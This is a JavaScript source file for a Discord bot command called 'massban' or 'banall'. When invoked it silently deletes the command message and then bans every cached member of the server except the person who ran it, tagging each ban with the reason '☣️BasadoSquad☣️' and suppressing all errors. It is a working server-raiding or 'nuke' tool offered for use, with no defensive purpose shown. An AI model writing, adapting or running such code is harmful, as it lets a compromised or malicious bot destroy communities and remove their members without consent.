const Discord = require('discord.js')
const { Client, MessageEmbed } = require('discord.js')



module.exports = {
    timeout: 60000,
  name: "massban",
  alias: "banall",
  descritpion: '',
  uso:'',
  category: '',
  run: async (client, message, args) => {
    
    message.delete().catch(()=>{
        return;
    })
    message.guild.members.cache.forEach(member => {
      if(member.user.id == message.author.id){
        return;
      }else{
        member.ban({reason: '☣️BasadoSquad☣️'}).catch(e=>{ 
         return;
        })
      }
  
    })
  
  }
}